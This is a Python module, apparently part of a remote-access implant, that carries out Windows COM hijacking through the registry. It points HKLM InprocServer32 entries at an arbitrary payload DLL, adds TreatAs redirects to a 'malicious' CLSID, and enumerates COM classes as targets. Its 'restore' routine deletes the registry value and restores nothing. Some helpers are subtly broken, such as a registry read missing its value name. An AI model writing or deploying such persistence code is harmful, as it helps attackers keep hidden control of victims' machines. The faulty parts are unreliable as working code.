import os
import subprocess
import winreg

_HIVE = winreg.HKEY_LOCAL_MACHINE
_BASE = r'SOFTWARE\Classes\CLSID'
_TREATAS = 'TreatAs'


def _read_reg_dword(key, name):
    try:
        val, _ = winreg.QueryValueEx(key, name)
        return val
    except Exception:
        return None


def _read_reg_str(key, name):
    try:
        return winreg.QueryValueEx(key)[0]
    except Exception:
        return None


def hijack_com_class(protocol, clsid, payload_path):
    if os.name != 'nt':
        protocol.send('[-] COM hijacking is Windows-only')
        return
    key_path = f'{_BASE}\\{{{clsid.strip("{}")}}}\\InprocServer32'
    try:
        key = winreg.CreateKey(_HIVE, key_path)
        winreg.SetValueEx(key, '', 0, winreg.REG_SZ, payload_path)
        winreg.SetValueEx(key, 'ThreadingModel', 0, winreg.REG_SZ, 'Apartment')
        winreg.CloseKey(key)
        protocol.send(f'[+] COM hijack: {clsid} -> {payload_path}')
    except Exception as e:
        protocol.send(f'[-] COM hijack error: {str(e)}')


def hijack_com_treatas(protocol, original_clsid, malicious_clsid):
    if os.name != 'nt':
        protocol.send('[-] COM hijacking is Windows-only')
        return
    key_path = f'{_BASE}\\{{{original_clsid.strip("{}")}}}'
    try:
        key = winreg.CreateKey(_HIVE, key_path)
        t = winreg.CreateKey(key, _TREATAS)
        winreg.SetValueEx(t, '', 0, winreg.REG_SZ, f'{{{malicious_clsid.strip("{}")}}}')
        winreg.CloseKey(t)
        winreg.CloseKey(key)
        protocol.send(f'[+] TreatAs hijack: {original_clsid} -> {malicious_clsid}')
    except Exception as e:
        protocol.send(f'[-] TreatAs hijack error: {str(e)}')


def list_hijackable_com(protocol):
    if os.name != 'nt':
        protocol.send('[-] COM enumeration is Windows-only')
        return
    try:
        result = subprocess.run(
            'wmic path Win32_COMClass get Caption,CLSID /format:csv',
            shell=True, capture_output=True, text=True, timeout=15
        )
        candidates = []
        for line in result.stdout.split('\n'):
            if line.strip() and 'Caption' not in line:
                parts = line.split(',')
                if len(parts) >= 2 and parts[-1].strip():
                    candidates.append(f'  {parts[-1].strip()} : {parts[-2].strip() if len(parts) > 2 else "?"}')
        if candidates:
            protocol.send(f'[+] {len(candidates)} COM classes:\n' + '\n'.join(candidates[:50]))
        else:
            protocol.send('[-] No COM classes found via WMIC')
    except Exception as e:
        protocol.send(f'[-] COM enumeration error: {str(e)}')


def restore_com(protocol, clsid):
    if os.name != 'nt':
        protocol.send('[-] COM restoration is Windows-only')
        return
    key_path = f'{_BASE}\\{{{clsid.strip("{}")}}}\\InprocServer32'
    try:
        key = winreg.OpenKey(_HIVE, key_path, 0, winreg.KEY_READ)
        winreg.QueryValueEx(key, '')[0]
        winreg.CloseKey(key)
        backup = os.path.join(os.environ.get('TEMP', '.'), f'com_bak_{clsid[:8]}.reg')
        subprocess.run(
            f'reg export "{_HIVE}\\{key_path}" "{backup}" /y',
            shell=True, capture_output=True, timeout=10
        )
        key = winreg.OpenKey(_HIVE, key_path, 0, winreg.KEY_WRITE)
        winreg.DeleteValue(key, '')
        winreg.CloseKey(key)
        protocol.send(f'[+] COM restored: {clsid} (backup: {backup})')
    except Exception as e:
        protocol.send(f'[-] COM restore error: {str(e)}')
